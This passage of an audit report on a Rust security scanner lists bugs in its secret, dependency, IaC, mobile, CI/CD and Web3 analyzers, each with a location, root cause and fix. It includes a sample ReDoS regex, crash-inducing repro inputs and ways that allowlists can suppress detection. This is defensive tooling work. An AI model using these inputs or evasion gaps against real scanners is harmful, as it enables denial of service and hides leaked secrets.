  1. Missing `-c core.quotePath=false` causes git to emit `+++ "b/src/caf\303\251.py"`, failing `strip_prefix("+++ b/")` and misattributing or dropping findings.
  2. Any added diff line starting with `++ b/test/x` becomes `+++ b/test/x`, matching line `241` and setting `skip_file = true` for the rest of the file.
  3. `skip_hunk` skips hunks whose `@@` context mentions `mod tests`/`fn test_`/`def test_`, suppressing production code below `mod tests` or functions like `fn test_connection()`.
  4. Line `303` only extracts `extracted_tokens.first()`, and line `338` hardcodes `paired_secret: None`, so AWS `AKIA` keys in git history can never be verified under `--verify-live`.
- **Surgical Fix:** Pass `-c core.quotePath=false`; only treat `+++ b/` as a header immediately after `--- ` (outside hunk bodies); remove `skip_hunk` (or limit to explicit test files); buffer hunk lines to extract `paired_secret` via `extract_aws_secret_near` and check all extracted tokens per line.

##### [F4A-06] `P1` — Silent Regex Compile Drop Turns `.gitleaks.toml` `condition = "AND"` Allowlists into Blanket Wildcard Suppressions
- **Location:** `crates/smg-graph/src/gitleaks_config.rs:71-79, 100-149, 176, 193` (`CompiledAllowlist::from_raw`, `CompiledAllowlist::matches`, `GitleaksConfig::load`, `parse_toml`)
- **Root Cause:** `.filter_map(|r| Regex::new(&r).ok())` silently drops PCRE2 regexes (e.g., lookbehind `(?<=...)` common in Gitleaks v8). In an `AND` allowlist with `paths = ["^docs/.*"]` and a dropped `regexes` list, `self.regexes.is_empty()` omits the regex check, turning the narrow `AND` rule into a blanket suppression for all of `docs/`. `load()` also silently ignores TOML syntax errors.
- **Surgical Fix:** Track `had_invalid_regex: bool` on `CompiledAllowlist` and fail-closed (`return false` in `matches()` for `AND` allowlists when any regex failed to compile); surface warnings/errors for invalid `.gitleaks.toml` syntax or unsupported regexes.

##### [F4A-07] `P1` — Unbounded Response Reads & JSON-Whitespace FPs in `src/live_verify.rs`
- **Location:** `src/live_verify.rs:378-415, 509` (`verify_single_token`, `verify_aws_sts`)
- **Root Cause:**
  1. `resp.text().unwrap_or_default()` has no byte cap (OOM risk on oversized responses).
  2. Slack checks `body.contains("\"ok\":true")` / `"\"ok\":false"` without parsing JSON; space-formatted `{"ok": false}` falls through to `200..=299 => VerifiedLive` (CRITICAL Proven FP on a revoked token!). Linear GraphQL similarly falls through to `VerifiedLive` on `200 {"errors": [...]}` without `"AUTHENTICATION_ERROR"`.
- **Surgical Fix:** Read response bodies with `.take(64 * 1024)` and parse Slack/Linear JSON via `serde_json::Value` (`v.get("ok").and_then(Value::as_bool)` and `v.get("errors").is_none()`).

##### [F4A-08] `P1` — 9 Lockfile/Manifest Types Bypass Advisory Checking in `deps.rs` (`mix.lock`, `go.sum`, `Pipfile.lock`, `gradle.lockfile`, etc.)
- **Location:** `crates/smg-graph/src/deps.rs:2443-2590` (`audit_generic_ecosystem_manifest`, `scan_dependencies_with_store`)
- **Root Cause:** `mix.lock` is missing from `scan_dependencies_with_store` (`_ => Vec::new()`). `go.sum`, `Pipfile.lock`, `gradle.lockfile`, `bun.lock`, `Package.resolved`, `composer.json`, `Gemfile`, and `pubspec.yaml` enter `audit_generic_ecosystem_manifest`, which only scans `http://` URLs and never queries `AdvisoryStore` or `OFFLINE_ADVISORIES` (even though `extract_resolved_dependencies` already parses `go.sum`, `Pipfile.lock`, `gradle.lockfile`, `mix.lock`, `pom.xml`). `pom.xml` only checks 3 hardcoded Maven packages.
- **Surgical Fix:** Add `"mix.lock"` to `scan_dependencies_with_store` and route `extract_resolved_dependencies` outputs for `go.sum`, `Pipfile.lock`, `gradle.lockfile`, `mix.lock`, and `pom.xml` through `check_advisories_batch` (normalizing Maven `group:artifact` vs `artifact`).

##### [F4A-09] `P1` — `pnpm-lock.yaml` Underscore Truncation & Multi-Version Transitive CVE Drops Across Lockfiles
- **Location:** `crates/smg-graph/src/deps.rs:2080-2097` (`parse_pnpm_pkg_key`) & `2103-2425` (`extract_lockfile_dep_graph`)
- **Root Cause:**
  1. `parse_pnpm_pkg_key` executes `key_no_peer.split('_').next()` before locating `@`, truncating and silently dropping every npm package whose name contains `_` (e.g., `@scope/my_pkg@1.0.0`). It also ignores pnpm v9's `snapshots:` section (missing edges).
  2. `LockfileDepGraph::nodes` is keyed by `pkg_name` (`HashMap<String, ...>` with `.or_insert`), dropping all additional resolved versions of a package when both a patched and a vulnerable transitive version coexist (e.g., `lodash@4.17.21` + `lodash@4.17.15`).
- **Surgical Fix:** Split peer-dep `_` suffixes only *after* the `@version` separator; parse `snapshots:` in pnpm v9; store `Vec<(String, bool, usize)>` (or key by `(pkg_name, version)`) so multi-version transitive CVEs are never dropped.

##### [F4A-10] `P1` — `parse_dpkg_status` Marks `not-installed` Packages as Installed & `TrivyIgnore::is_ignored` Substring Over-Matches
- **Location:** `src/oci_image.rs:64-70` (`TrivyIgnore::is_ignored`) & `181` (`parse_dpkg_status`)
- **Root Cause:** `v.contains("installed")` matches `"Status: purge ok not-installed"` and `"deinstall ok not-installed"`, reporting removed packages as vulnerable (FP). `up.contains(id)` in `TrivyIgnore::is_ignored` lets `CVE-2024-123` suppress `CVE-2024-12345`.
- **Surgical Fix:** Check `v.split_whitespace().any(|w| w == "installed")` in `parse_dpkg_status`; match whole-token/exact advisory IDs in `TrivyIgnore::is_ignored`.

#### P2 — Edge Case / Perf / Resource Leak

##### [F4A-11] `P2` — `deps_sync.rs` Ignores OSV `next_page_token`, Silently Caps at 2,000 Vulns, & Sends Bare Distro Ecosystems
- **Location:** `src/deps_sync.rs:80-103, 215-248` (`to_osv_ecosystem`, `sync_osv_to_store`)
- **Root Cause:** `/v1/querybatch` pagination (`next_page_token`) is ignored; `unique_ids.iter().take(2000)` silently truncates without reporting; `to_osv_ecosystem` sends bare `"Debian"`/`"Alpine"` whereas OSV requires release-qualified names (`Debian:12`, `Alpine:v3.19`).
- **Surgical Fix:** Follow `next_page_token`, expose `truncated: bool` on `DepsSyncSummary`, and preserve `:release` qualifiers when present.

##### [F4A-12] `P2` — `gitleaks_config.rs` Line-Wide Stopword/Regex Match, Short Commit Prefix, & `nosecret` Identifier Match
- **Location:** `crates/smg-graph/src/gitleaks_config.rs:106-135, 307-312`
- **Root Cause:** `stopwords`/`regexes` match anywhere on `line` (letting a comment word suppress a real secret), `low.starts_with(c)` allows 1-char commit prefixes, and `low.contains("nosecret")` matches code identifiers.
- **Surgical Fix:** Honor Gitleaks `regexTarget`, require commit prefixes `>= 7` hex chars, and match `nosecret` only inside comment tokens.

##### [F4A-13] `P2` — `live_verify.rs` `hist_map` Collides on `(file, line)` Across Commits
- **Location:** `src/live_verify.rs:551-555` (`run_live_secret_verification`)
- **Root Cause:** Indexing `hist_map` solely by `(file, line)` overwrites earlier commit candidates when two commits leaked different secrets on the same line, verifying the wrong token.
- **Surgical Fix:** Key `hist_map` by `(file, line, commit_short_sha)` (matching `f.symbol = "git:<short_sha>"`).

##### [F4A-14] `P2` — `deps.rs` `O(P * L)` Quadratic `find_line_for_needle` & Namespace `*` Downgraded to `ImportedSafeApiOnly`
- **Location:** `crates/smg-graph/src/deps.rs:309` (`assess_dependency_vex_tier`) & `1095-1155` (`audit_package_lock`)
- **Root Cause:** `audit_package_lock` (and `composer.lock`/`packages.lock.json`) calls linear `find_line_for_needle` per package (`O(P * L)`); `assess_dependency_vex_tier` returns `ImportedSafeApiOnly` whenever `saw_any_concrete_call` is true even if `*` namespace was imported and could be invoked dynamically. Also `audit_pyproject_toml:1607` skips `pycrypto>=2.6.1` (`fixed_below: None`).
- **Surgical Fix:** Index line numbers in a single linear pass; require `!imported.contains("*")` or no dynamic/escaping references for `ImportedSafeApiOnly`; always check `fixed_below: None` advisories on `>=` specs.

### 4A.3 Per-File Verdict Table (Form 4A)

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-graph/src/secrets_config.rs` | 1,913 | `BLOCKED — PC Control filename filter (SECRET_BLOCKED)` | *(not read; zero extrapolated findings)* |
| `crates/smg-graph/src/git_history.rs` | 449 | `FINDINGS: 2` | F4A-03, F4A-05 |
| `crates/smg-graph/src/gitleaks_config.rs` | 382 | `FINDINGS: 2` | F4A-06, F4A-12 |
| `crates/smg-graph/src/deps.rs` | 3,185 | `FINDINGS: 3` | F4A-08, F4A-09, F4A-14 |
| `src/deps_sync.rs` | 485 | `FINDINGS: 1` | F4A-11 |
| `src/oci_image.rs` | 578 | `FINDINGS: 3` | F4A-02, F4A-04, F4A-10 |
| `src/live_verify.rs` | 892 | `FINDINGS: 3` | F4A-01, F4A-07, F4A-13 |
| **Total (Form 4A — 6/7 readable)** | **7,884** | **14 Unique Findings (3 P0 · 7 P1 · 4 P2 · 0 P3)** | |

---

## Form 4 (Session 4B) — Cloud IaC, Mobile (MobSF), CI/CD, ReDoS/ZipSlip, Protocols/AI & Rule Packs

- **Scope:** 11 Rust source files (**8,008 LOC**, 100% read line 1 to EOF): `iac_policy.rs` (871), `langs/hcl.rs` (1,031), `infra_dos.rs` (1,305), `protocols_ai.rs` (877), `phase9/mobile.rs` (1,028), `rules.rs` (1,023), `rule_pack/{mod,ai_supply_chain,cloud_iac,crypto_legacy,web_frameworks}.rs` (1,873).
- **Totals:** **14 unique findings** — **1 P0**, **8 P1**, **3 P2**, **2 P3** (0 duplicates of Form 4A)

### 4B.1 Executive Summary

- **Highest-Impact Risks:**
  1. **P0 Unbounded HCL Recursion & Quadratic Nested-Block Collection (`F4B-01`):** `collect_hcl_file_graph`, `walk_hcl_blocks`, `collect_nested_blocks`, and `collect_nested_block_attrs` in `langs/hcl.rs` have zero depth caps, causing stack overflow (and quadratic work) on deeply nested `.tf` files.
  2. **P1 Systematic 2×–3× Duplicate IaC Findings & Invalid Rule ID Typo (`F4B-02`):** `hcl.rs:283` deduplicates by exact `e.title == hit.title`, so overlapping checks across `hcl.rs`, `iac_policy.rs`, and `rule_pack/cloud_iac.rs` emit 2–3 duplicate findings for the same resource (`aws_instance` IMDSv1, `aws_ebs_volume`, `aws_db_instance`, `azurerm_storage_account`, `google_container_cluster`, `aws_kms_key`, `aws_eks_cluster`, `aws_lambda_function_url`); `iac_policy.rs:517` also uses nonexistent rule ID `"SMG-CFG-IAC-IPC"` instead of `"SMG-CFG-IAC-IAM"`.
  3. **P1 High-FP Non-Mobile Triggers, Duplicate Check & File-Wide Suppressions in `phase9/mobile.rs` (`F4B-03`, `F4B-04`):** `analyze_mobile_ast` runs Android/iOS/Flutter rules on backend Java/Kotlin/Swift/Dart code without mobile import gating; `scan_android_code` checks `setallowfileaccessfromfileurls(true)` twice (lines 446 & 611); `Log.*` flags static log labels containing `"token"`; file-wide `uses_keychain`/`uses_secure_storage` suppresses unencrypted `UserDefaults`/`SharedPreferences` writes elsewhere in the file.
  4. **P1 Multiline `run: |` Pwn-Request FN, Post-Sink ZipSlip/Crypto Suppression & Comment-Blind `file_exempt_any` (`F4B-05`–`F4B-09`):** `infra_dos.rs:369-380` misses multiline `run: |` builds after unsafe `pull_request_target` checkout; `scan_zipslip_patterns` checks 15 lines *after* the sink (including comments); `scan_crypto_math_patterns` uses file-wide `has_const_time_api`; `protocols_ai.rs` uses file-wide `has_global_ws_auth` (`io.use(logger)` suppresses all WS RCE); `rule_pack/mod.rs` brace counter breaks on `{`/`}` inside Rust string literals and `file_exempt_any` scans unstripped comments.

### 4B.2 Findings (P0–P3)

#### P0 — Crash / Security / Soundness Break

##### [F4B-01] `P0` — Unbounded AST Recursion Stack-Overflow DoS in `langs/hcl.rs`
- **Location:** `crates/smg-graph/src/langs/hcl.rs:26` (`collect_hcl_file_graph`), `72` (`walk_hcl_blocks`), `150` (`collect_nested_blocks`), `291` (`collect_nested_block_attrs`)
- **Root Cause:** None of these recursive HCL walkers enforce `MAX_AST_WALK_DEPTH`, and `collect_nested_block_attrs` calls `collect_nested_blocks` (which recurses) and then recurses again on each child body—causing stack overflow and quadratic work on deeply nested HCL blocks. *(Parallels `F2A-04`/`F2B-01`/`F2C-02`.)*
- **Surgical Fix:** Thread `depth: usize` bounded by `MAX_AST_WALK_DEPTH` (e.g., `<= 64`) and make `collect_nested_blocks` inspect direct children only.

#### P1 — Real Bug / High FP or FN

##### [F4B-02] `P1` — 2×–3× Duplicate Cloud IaC Findings Across `hcl.rs`, `iac_policy.rs` & `cloud_iac.rs` + `"SMG-CFG-IAC-IPC"` Typo + Single-File Variable Scope
- **Location:** `crates/smg-graph/src/langs/hcl.rs:172, 283, 303`, `crates/smg-graph/src/iac_policy.rs:69, 517`, `crates/smg-graph/src/rule_pack/cloud_iac.rs`
- **Root Cause:**
  1. `hcl.rs:283` deduplicates by `e.title == hit.title`, which never matches across `hcl.rs`, `[CKV_*]` titles in `iac_policy.rs`, and `rule_pack/cloud_iac.rs` (producing 2–3 duplicate alerts for `aws_instance` IMDSv1, `aws_ebs_volume`, `aws_db_instance`, `azurerm_storage_account`, `google_container_cluster`, `aws_kms_key`, `aws_eks_cluster`, `aws_lambda_function_url`).
  2. `iac_policy.rs:517` (`CKV_GCP_7`) emits `"SMG-CFG-IAC-IPC"` (nonexistent in `RULE_CATALOG`; should be `"SMG-CFG-IAC-IAM"`).
  3. `hcl.rs:172, 303` only resolves exact whole-attribute `var.*`/`local.*` within a single `.tf` file (missing `"${var.acl}"`, chained locals, and cross-file `variables.tf` / `aws_s3_bucket_public_access_block`).
  4. `iac_policy.rs:69` compares `clean_val(v)` (lowercased) against un-lowercased `bad_values`/`expected_values` from custom JSON packs.
- **Surgical Fix:** Remove overlapping TF rules from `rule_pack/cloud_iac.rs` (or deduplicate by `(rule_id, line, symbol)`), fix `"SMG-CFG-IAC-IPC"` -> `"SMG-CFG-IAC-IAM"`, lowercase custom policy `bad_values`/`expected_values` on load, and support `"${var.*}"` / cross-file `variables.tf` resolution.

##### [F4B-03] `P1` — `phase9/mobile.rs` Fires Mobile Rules on Backend Java/Kotlin/Swift/Dart Code, Duplicates `setAllowFileAccessFromFileURLs`, & Flags Static Log Labels
- **Location:** `crates/smg-graph/src/phase9/mobile.rs:327-350, 446, 611, 642, 978`
- **Root Cause:**
  1. `analyze_mobile_ast` runs `scan_android_code`, `scan_swift_mobile`, and `scan_dart_mobile` on *all* Java/Kotlin/Swift/Dart files without checking for mobile imports (`android.`, `UIKit`, `SwiftUI`, `package:flutter`), firing `SMG-MOB-STORAGE` on backend Spring/Vapor/Dart servers and duplicating `crypto_legacy.rs`.
  2. `setallowfileaccessfromfileurls(true)` is checked twice in `scan_android_code` (lines `446` and `611`), emitting duplicate `SMG-MOB-IPC` findings on the same line.
  3. `Log.d/v/i/e` (line `642`) fires Confirmed findings on static log messages containing `"token"` with no interpolated variable; Dart `sqflite` (line `978`) flags parameterized `$1` or SQL `+` arithmetic.
- **Surgical Fix:** Gate Android/iOS/Flutter scanners on mobile framework imports; remove the duplicate check at line `611`; require variable interpolation/concatenation for `Log.*`; check string interpolation `$var`/`${` rather than bare `'
`/`" + "` in Dart.

##### [F4B-04] `P1` — File-Wide `uses_keychain`/`uses_secure_storage` Suppression & `network_security_config.xml` `<domain-config>` Ordering Bug
- **Location:** `crates/smg-graph/src/phase9/mobile.rs:52-70, 211, 714, 894, 995`
- **Root Cause:**
  1. `uses_keychain` (Swift line `714`), `uses_secure_storage` (Dart line `894`), and `uses_secure` (RN line `995`) are file-wide booleans—using secure storage in one function suppresses plaintext `UserDefaults`/`SharedPreferences`/`AsyncStorage` writes everywhere else in the file (FN).
  2. In `scan_network_security_config` (line `211`), `cleartextTrafficPermitted="true"` on `<domain-config ...>` is evaluated *before* `<domain>localhost</domain>` on the next line (FP on localhost dev configs), while `in_local_domain = true` suppresses `<certificates src="user"/>` even if production domains share the block (FN).
  3. `blank_xml_comments` (line `52`) appends unclosed `<!--` verbatim instead of blanking to EOF.
- **Surgical Fix:** Remove file-wide `uses_keychain`/`uses_secure_storage` flags (evaluate per-statement receiver); parse `<domain-config>` blocks as a whole before deciding localhost-only exemption; blank to EOF on unclosed `<!--`.

##### [F4B-05] `P1` — `infra_dos.rs` Misses Multiline `run: |` Pwn-Request Builds & Leaks `tainted_workflow_envs` Across Jobs
- **Location:** `crates/smg-graph/src/infra_dos.rs:204, 221, 369-380` (`scan_cicd_workflow`)
- **Root Cause:** `runs_checked_out_code` is checked only for single-line `run:` commands (line `380`), never inside multiline `run: |` blocks (100% FN on multiline `pull_request_target` builds). `tainted_workflow_envs` is also never cleared when entering a new job at line `221`.
- **Surgical Fix:** Check `saw_unsafe_checkout && runs_checked_out_code` inside the `in_run_block_indent` branch as well, and clear `tainted_workflow_envs` on new job boundaries (preserving only workflow-level `env:`).

##### [F4B-06] `P1` — `infra_dos.rs` Post-Sink & Comment-Blind ZipSlip Window + File-Wide `has_const_time_api` Suppression (FN)
- **Location:** `crates/smg-graph/src/infra_dos.rs:863-868` (`scan_zipslip_patterns`) & `1036, 1064` (`scan_crypto_math_patterns`)
- **Root Cause:** `scan_zipslip_patterns` builds `local_win` across `[idx-15 .. idx+15]` on raw unstripped lines (so a comment `// check contains("..")` or a post-sink check suppresses `CRITICAL` `SMG-ZIP-001`). `has_const_time_api` is file-wide, so one `timingSafeEqual` call suppresses every insecure `signature === expectedSig` elsewhere in the file.
- **Surgical Fix:** Strip comments first, restrict `local_win` to preceding lines in the same function, and scope `has_const_time_api` to the enclosing function/line.

##### [F4B-07] `P1` — `protocols_ai.rs` File-Wide `has_global_ws_auth` (`io.use(logger)` FN) & Dead `serverinterceptor` gRPC Branch
- **Location:** `crates/smg-graph/src/protocols_ai.rs:242, 267, 295-310, 381`
- **Root Cause:** `has_global_ws_auth` treats *any* `io.use(` or `ws.use(` (even logging middleware) as authentication for the entire file (FN on WS RCE). On line `299`, `has_interceptor` includes `low_full.contains("serverinterceptor")`, making the `serverinterceptor` trigger on line `295` dead code. `ai_vars.clear()` (line `381`) misses arrow functions and indented class methods, leaking AI taint across sibling methods.
- **Surgical Fix:** Require auth keywords inside `io.use(...)`/`ws.use(...)` rather than bare `io.use(`; check for *auth* interceptors rather than any `serverinterceptor`; reset `ai_vars` at class-method and arrow-function boundaries.

##### [F4B-08] `P1` — `rule_pack/mod.rs` `#[cfg(test)]` Brace Counter Breaks on String Literals & Comment-Blind `file_exempt_any` Suppresses Rules File-Wide
- **Location:** `crates/smg-graph/src/rule_pack/mod.rs:152-168, 226-231` (`scan_rule_pack`)
- **Root Cause:**
  1. `in_cfg_test` counts raw `{` / `}` characters without ignoring string/char literals or comments—a `"}"` in a test fixture prematurely exits `in_cfg_test` (FP), while `"{"` swallows production code after `#[cfg(test)]` (FN).
  2. `file_exempt_any` scans raw unstripped `content.to_ascii_lowercase()`, so a comment like `// TODO: use defusedxml` or `// jwt` suppresses rules (`py_xml_parser`, `spring_csrf_disable`, `XStream`, `TypeNameHandling`, `go_jwt_valid_methods`, `langchain_repl_tool`) across the entire file (FN).
- **Surgical Fix:** Strip comments/string literals before counting `#[cfg(test)]` braces (or use Tree-sitter AST spans), and strip comments before evaluating `file_exempt_any`.

##### [F4B-09] `P1` — `infra_dos.rs` `scan_redos_patterns` Truncates JS Regex Literals at Escaped `\/`
- **Location:** `crates/smg-graph/src/infra_dos.rs:792-799` (`scan_redos_patterns`)
- **Root Cause:** `rest.find('/')` stops at the first `/` even when escaped (`\/`), missing ReDoS in JS regex literals like `const re = /https?:\/\/(a+)+/;`.
- **Surgical Fix:** Scan for the first unescaped `/` (skipping `\\` escape pairs and `[...]` character classes).

#### P2 — Edge Case / Perf / Resource Leak

##### [F4B-10] `P2` — `protocols_ai.rs` Computes `block_window(lines, idx, 4, 6)` 3× Redundantly & Allows Post-Sink `redirect_uri` Suppression
- **Location:** `crates/smg-graph/src/protocols_ai.rs:579-587` (`scan_oauth_pkce_state_redirect`)
- **Surgical Fix:** Compute `block_window` once (using preceding lines only for dominance checks) and check all 3 allowlist markers against it.

##### [F4B-11] `P2` — `infra_dos.rs` K8s Scanner Inherits `O(N^2)` YAML Split & Uses Raw `split('#')`
- **Location:** `crates/smg-graph/src/infra_dos.rs:395, 403, 423` (`scan_kubernetes_manifest`, `analyze_k8s_doc`)
- **Root Cause:** Calls `split_yaml_documents_preserving_lines` (`F1-06` `O(N^2)` memory DoS) and uses raw `split('#')` instead of `strip_yaml_comment_quoted`.
- **Surgical Fix:** Adopt the `O(N)` `(start_line, &str)` YAML splitter from `F1-06` and use `strip_yaml_comment_quoted` consistently.

##### [F4B-12] `P2` — Duplicate Findings Between `rule_pack/` and `infra_dos.rs` / `mobile.rs`
- **Location:** `crates/smg-graph/src/rule_pack/crypto_legacy.rs:14-42` vs `infra_dos.rs:1049` (`AES/ECB`, `rc4.NewCipher`, `createCipheriv('aes-*-ecb')`) and `mobile.rs:590` (`Cipher.getInstance("AES/ECB/...")`)
- **Surgical Fix:** Deduplicate `SMG-CRYPTO-001` / `SMG-MOB-STORAGE` overlaps or own each pattern in one module.

#### P3 — Hygiene / Dead Logic

##### [F4B-13] `P3` — Dead `AesGcm` Alternation in `rule_pack/crypto_legacy.rs`
- **Location:** `crates/smg-graph/src/rule_pack/crypto_legacy.rs:181-193` (`dotnet_legacy_rsa`)
- **Root Cause:** Regex matches `\bAesGcm\s*\(\s*key\s*\)\s*;|\bnew\s+RSACryptoServiceProvider\s*\(\s*\)`, but `line_exempt_any: &["aesgcm"]` unconditionally exempts every line matching the first branch.
- **Surgical Fix:** Remove the dead `\bAesGcm\s*\(\s*key\s*\)\s*;` branch and `line_exempt_any`.

##### [F4B-14] `P3` — `rules.rs` `find_rule_doc` Prefix Fallback Silently Masks Invalid Rule IDs
- **Location:** `crates/smg-graph/src/rules.rs:978-990` (`find_rule_doc`)
- **Root Cause:** Prefix fallback matches any unknown ID sharing a prefix (e.g., `find_rule_doc("SMG-CFG-IAC-IPC")` silently returns `SMG-CFG-IAC-PUBLIC` instead of `None`).
- **Surgical Fix:** Restrict prefix fallback to known family prefixes or return `None` for unrecognized sub-rules in tests/validation.

### 4B.3 Per-File Verdict Table (Form 4B) & Form 4 Rollup

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-graph/src/iac_policy.rs` | 871 | `FINDINGS: 1` | F4B-02 |
| `crates/smg-graph/src/langs/hcl.rs` | 1,031 | `FINDINGS: 2` | F4B-01, F4B-02 |
| `crates/smg-graph/src/infra_dos.rs` | 1,305 | `FINDINGS: 4` | F4B-05, F4B-06, F4B-09, F4B-11 |
| `crates/smg-graph/src/protocols_ai.rs` | 877 | `FINDINGS: 2` | F4B-07, F4B-10 |
| `crates/smg-graph/src/phase9/mobile.rs` | 1,028 | `FINDINGS: 3` | F4B-03, F4B-04, F4B-12 |
| `crates/smg-graph/src/rules.rs` | 1,023 | `FINDINGS: 1` | F4B-14 |
| `crates/smg-graph/src/rule_pack/mod.rs` | 373 | `FINDINGS: 1` | F4B-08 |
| `crates/smg-graph/src/rule_pack/ai_supply_chain.rs` | 199 | `CLEAN — verified line-by-line` | — |
| `crates/smg-graph/src/rule_pack/cloud_iac.rs` | 263 | `FINDINGS: 1` | F4B-02 |
| `crates/smg-graph/src/rule_pack/crypto_legacy.rs` | 259 | `FINDINGS: 2` | F4B-12, F4B-13 |
| `crates/smg-graph/src/rule_pack/web_frameworks.rs` | 779 | `CLEAN — verified line-by-line` | — |
| **Total (Form 4B)** | **8,008** | **14 Unique Findings (1 P0 · 8 P1 · 3 P2 · 2 P3)** | |
| **Form 4 Combined (17/18 readable)** | **15,892** | **28 Unique Findings (4 P0 · 15 P1 · 7 P2 · 2 P3)** | *(1 file `secrets_config.rs` blocked by PC Control)* |

---

## Form 5 (Session 5A) — Web3 Smart Contract, EVM REVM Oracle, Solana & Move Analysis (`crates/smg-web3`)

- **Scope:** 5 Rust source files in `crates/smg-web3/src/` (5,447 LOC, 100% read line 1 to EOF)
- **Totals:** **14 unique findings** — **5 P0**, **9 P1**, **0 P2**, **0 P3** (0 files `CLEAN`, 5 files with findings)

### 5A.1 Executive Summary

All 5 files in `crates/smg-web3/src/` (5,447 lines) were audited line-by-line across all 6 mandatory lenses.

- **Highest-Impact Risks:**
  1. **P0 Broken Multi-Tx Stateful REVM Invariant Replay (`evm_oracle.rs:784-860`):** `replay_invariant_sequence` hardcodes `nonce: 0` (via `..Default::default()`) on every transaction in a multi-step sequence, causing every 2nd+ transaction from the same actor to fail with `InvalidTransaction::NonceTooLow` and be silently skipped.
  2. **P0 EVM Bytecode Memory-Offset Truncation & Collision (`evm_oracle.rs:240, 340, 395, 399-413`):** `(chunk_idx * 32) as u8` wraps modulo 256 for calldata > 256 bytes, corrupting generated attacker bytecode; `probe_view_reentrancy_in_revm` also hardcodes `retOff = 0x40`, colliding with `view_calldata` when > 64 bytes.
  3. **P0 Runtime UTF-8 Slicing Panic (`context.rs:513`):** `link_library_placeholders` slices `&clean[i..i + 40]` using raw byte indices after matching `"__"`, panicking on multi-byte UTF-8 characters straddling `i + 40`.
  4. **P0 Unbounded AST Recursion Stack-Overflow DoS (`solidity.rs:121, 140, 279`; `svm_move.rs:128, 222`):** Recursive tree-sitter walkers in both Solidity and Solana Rust analyzers have no recursion depth guard, allowing deeply nested expressions/blocks to crash the scanner with a stack overflow.
  5. **P1 Systemic Static-Analysis Soundness & Coverage Gaps:** Unreachable ERC-7201 proxy check (`!p && p`), `smg-web3/src/lib.rs` skipping `deep_audit` REVM campaigns for ERC-7201 contracts, Anchor `Program<` suppressing arbitrary CPI checks on unvalidated `AccountInfo` fields in the same struct, and Move `analyze_move_file` aborting the entire file whenever `#[test_only]` appears anywhere.

### 5A.2 Findings (P0–P1)

#### P0 — Crash / Security / Soundness Break

##### [F5A-01] `P0` — Hardcoded `nonce: 0` Silently Breaks Multi-Transaction REVM Invariant Campaigns
- **Location:** `crates/smg-web3/src/evm_oracle.rs:784-860` (`replay_invariant_sequence`, `TxEnv` construction at line `820`)
- **Root Cause:** Unlike `execute_revm_sequence` (which tracks per-caller `nonces: HashMap<Address, u64>`), `replay_invariant_sequence` builds every step's `TxEnv` with `..Default::default()`, leaving `nonce: 0`. Because `actors` has only 3 addresses while `step_count` ranges from 6 to 64, every second and subsequent transaction from the same actor fails EVM validation with `InvalidTransaction::NonceTooLow` and is silently discarded by `if let Ok(ExecutionResult::Success { .. })`.
- **Minimal Repro / Trace:** Any stateful invariant campaign requiring 2+ calls from the same actor (e.g., `deposit()` followed by `withdraw()`) executes only the first call per actor (at most 3 total txs), silently failing to discover multi-step drain invariants.
- **Surgical Fix:** Track `nonces: HashMap<Address, u64>` inside `replay_invariant_sequence`, pass `nonce` into `TxEnv`, and increment `*nonces.entry(step.caller).or_insert(0) += 1` after each executed transaction.

##### [F5A-02] `P0` — EVM Attacker Bytecode `u8` Memory-Offset Truncation & `retOff` Collision
- **Location:** `crates/smg-web3/src/evm_oracle.rs:220-260, 279-355, 365-430` (`build_forwarding_reentrant_attacker:240`, `build_callback_reentrant_attacker:340`, `probe_view_reentrancy_in_revm:395, 399, 408, 413`)
- **Root Cause:** All three runtime bytecode generators compute `let mem_off = (chunk_idx * 32) as u8;`. For any ABI-encoded calldata exceeding 256 bytes (8+ 32-byte words, common for multi-arg functions, arrays, or bytes payloads), `mem_off` wraps modulo 256 and overwrites earlier calldata words in EVM memory. Additionally, `probe_view_reentrancy_in_revm` hardcodes `retOff = 0x40` (`PUSH1 0x40`), which collides with `view_calldata` stored starting at `0x00` whenever `view_calldata.len() > 64`.
- **Minimal Repro / Trace:** Pass a 288-byte calldata payload (9 words): `chunk_idx = 8` computes `(8 * 32) as u8 == 0`, overwriting the 4-byte function selector at memory offset `0x00`.
- **Surgical Fix:** Emit `PUSH2` (`0x61`) for 16-bit memory offsets (`u16::try_from(chunk_idx * 32)`) and place `retOff` dynamically at `view_calldata_padded_len` (rounded up to 32 bytes), rejecting payloads exceeding `u16::MAX` cleanly.

##### [F5A-03] `P0` — Runtime UTF-8 Char-Boundary Slicing Panic in `link_library_placeholders`
- **Location:** `crates/smg-web3/src/context.rs:497-525` (`link_library_placeholders`, line `513`)
- **Root Cause:** The loop iterates byte-by-byte over `bytes = clean.as_bytes()` and executes `let slice = &clean[i..i + 40];` whenever `bytes[i] == b'_' && bytes[i + 1] == b'_'`. If an untrusted/corrupted JSON artifact bytecode string contains `"__"` followed by multi-byte UTF-8 characters such that byte index `i + 40` lands inside a multi-byte character, Rust panics at runtime (`byte index N is not a char boundary`). (The existing unit test `decode_hex_bytecode("0x€a")` did not trigger this because it contained no `"__"`.)
- **Minimal Repro / Trace:** Call `link_library_placeholders(&format!("__{}{}", "a".repeat(37), "€a"))` -> `i = 0`, `i + 40 = 40` splits `"€"` (bytes 39..42) -> panic.
- **Surgical Fix:** Inspect `&bytes[i..i + 40]` directly as bytes (checking `bytes[i + 38] == b'_' && bytes[i + 39] == b'_'` and ASCII validity) or verify `clean.is_char_boundary(i) && clean.is_char_boundary(i + 40)` before slicing.

##### [F5A-04] `P0` — Unbounded Tree-Sitter AST Recursion Stack-Overflow DoS in Solidity Analyzer
- **Location:** `crates/smg-web3/src/solidity.rs:121-150, 279-360` (`collect_identifiers:121`, `lhs_root_identifier:140`, `walk_fn_body:279`)
- **Root Cause:** `walk_fn_body`, `collect_identifiers`, and `lhs_root_identifier` recurse unconditionally down `tree_sitter::Node` children with no `MAX_AST_WALK_DEPTH` guard.
- **Minimal Repro / Trace:** A malicious or machine-generated `.sol` file with deeply nested parenthesized expressions (`((((...))))`) or nested `{ { { ... } } }` blocks overflows the worker thread stack and aborts the scanner process.
- **Surgical Fix:** Add a `depth: usize` parameter capped at `const MAX_AST_WALK_DEPTH: usize = 256;` (matching hardened walkers elsewhere) to all recursive AST helpers, returning cleanly when exceeded.

##### [F5A-05] `P0` — Unbounded Tree-Sitter AST Recursion Stack-Overflow DoS in Solana Rust Analyzer
